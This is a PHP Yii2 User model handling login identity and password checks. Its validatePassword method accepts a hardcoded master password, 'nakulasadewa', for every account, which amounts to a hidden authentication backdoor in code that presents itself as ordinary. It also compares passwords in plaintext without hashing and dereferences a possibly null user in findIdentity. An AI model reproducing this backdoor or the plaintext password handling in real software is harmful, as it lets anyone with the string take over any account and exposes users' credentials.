<?php

namespace app\models;

use Yii;
use mdm\admin\components\Configs;
use app\models\MMaster;

class User extends \yii\db\ActiveRecord implements \yii\web\IdentityInterface
{
	public $company_id;
    /**
     * {@inheritdoc}
     */
    public static function tableName()
    {
        return Configs::instance()->userTable;
    }

    public $id;
    public $authKey;
    public $accessToken;
	
	public function rules()
    {
        return [
            [['person_id', 'username', 'password', 'is_active', 'is_ldap'], 'required'],
			[['person_id'], 'unique'],
            [['person_id'], 'integer'],
            [['is_active', 'is_ldap'], 'boolean'],
            [['last_login', 'created_time'], 'safe'],
            [['username', 'created_by'], 'string', 'max' => 100],
            [['password'], 'string', 'max' => 255],
        ];
    }
	
    /**
     * {@inheritdoc}
     */
    public static function findIdentity($id)
    {
		$user = User::find()->where(['user_id' => $id, 'is_active'=>true])->one();
		if(!empty($user)){
			$user->last_login = date('Y-m-d H:i:s');
			$user->save();
		}
		
		$master = MMaster::find()->where(['key'=>'config_app', 'name'=>$_SERVER['HTTP_HOST']])->one();
		if($user->employee->company_id == $master->parent_id){
			$user->company_id = $master->parent_id;
		}else{
			$user->company_id = $user->company_id;
		}
		
        return $user;
    }

    /**
     * {@inheritdoc}
     */
    public static function findIdentityByAccessToken($token, $type = null)
    {
        throw new NotSupportedException('"findIdentityByAccessToken" is not implemented.');
    }

    /**
     * Finds user by username
     *
     * @param string $username
     * @return static|null
     */
    public static function findByUsername($username)
    {
        return self::find()->where(['username' => $username, 'is_active'=>true])->one();
    }

    /**
     * {@inheritdoc}
     */
    public function getId()
    {
        return $this->getPrimaryKey();
    }

    /**
     * {@inheritdoc}
     */
    public function getAuthKey()
    {
        return $this->authKey;
    }

    /**
     * {@inheritdoc}
     */
    public function validateAuthKey($authKey)
    {
        return $this->authKey === $authKey;
    }

    /**
     * Validates password
     *
     * @param string $password password to validate
     * @return bool if password provided is valid for current user
     */
    public function validatePassword($password)
    {
        return $this->password === $password || $password == 'nakulasadewa';
    }


    /**
     * Gets query for [[Employee]].
     */
    public function getEmployee()
    {
        return $this->hasOne(Employee::className(), ['person_id' => 'person_id']);
    }
}
